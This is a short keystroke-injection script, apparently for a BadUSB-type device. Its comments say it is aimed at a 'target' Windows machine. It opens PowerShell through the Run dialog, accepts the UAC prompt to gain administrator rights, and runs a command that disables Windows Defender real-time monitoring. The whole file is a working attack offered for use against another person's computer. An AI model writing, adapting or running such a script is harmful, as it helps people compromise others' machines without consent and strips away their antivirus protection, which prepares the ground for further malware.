//Your target must be an administrator for this to work
//also this is not persistent so it won't work if you or your target closes powershell
layout("de");

//opens run window
press("GUI r");
delay(100);

//opens powershell
type("powershell");
press("Enter");

//gets administrator privilages
type("Start-Process powershell -Verb runAs");
press("Enter");
delay(1000);

press("LEFT");
press("Enter");
delay(500);

//disables real time monitoring
type("Set-MpPreference -DisableRealtimeMonitoring $true");
press("Enter");
